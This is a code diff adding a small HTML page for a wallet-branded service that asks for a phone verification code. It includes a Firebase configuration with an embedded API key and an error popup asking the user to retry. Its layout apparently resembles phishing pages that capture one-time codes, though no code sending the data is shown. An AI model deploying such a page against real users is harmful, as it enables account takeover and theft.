@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/style.css">
+    <link rel="icon" href="https://i.postimg.cc/FRnFpKWM/wallet.png">
+    <title>Verification </title>
+</head>
+    <div class="container">
+        <div class="form">
+            <h1>Verification code </h1>
+            <p>Please set this code you have recieved on you phone number</p>
+            <form id="form-signup">
+        <div class="group-form">
+            <input type="text" name="phone-verification " id="phone-verification " placeholder="12654" required autocomplete="off">
+        </div>
+        <div class="group-form">
+            <button class="btn-signup">verification </button>
+        </div>
+    </form>
+    </div>
+</div>
+<footer>
+    <p>
+        copyright &copy; all rights reserved
+    </p>
+</div>
+</footer>
+
+<!-- Error popup -->
+<div class="error-container">
+    <div class="popup">
+        <img src="https://i.postimg.cc/NGTr8pyG/404-Error-Page-not-Found-with-people-connecting-a-plug-amico.png" alt="Error" >
+        <strong>Error!</strong>
+        <p>There is an error please try again.</p>
+        <div class="footer-controls">
+            <button class="btn-tryagain">Retry</button>
+        </div>
+    </div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-auth.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-analytics.js"></script>
+<script defer src="https://www.gstatic.com/firebasejs/7.15.1/firebase-firestore.js"></script>
+
+
+<script type="text/javascript">
+  var firebaseConfig = {
+    apiKey: "AIzaSyCVJy14NLkR55CQx94oZLOzny8W4T25hYk",
+    authDomain: "wallet-extension.firebaseapp.com",
+    databaseURL: "https://wallet-extension.firebaseio.com",
+    projectId: "wallet-extension",
+    storageBucket: "wallet-extension.appspot.com",
+    messagingSenderId: "45020600167",
+    appId: "1:45020600167:web:06e6ab8091bf06f1f741c2",
+    measurementId: "G-2QPEZ5CBGZ"
+  };
+  firebase.initializeApp(firebaseConfig);
+  
+</script>
+</body>
+</html>
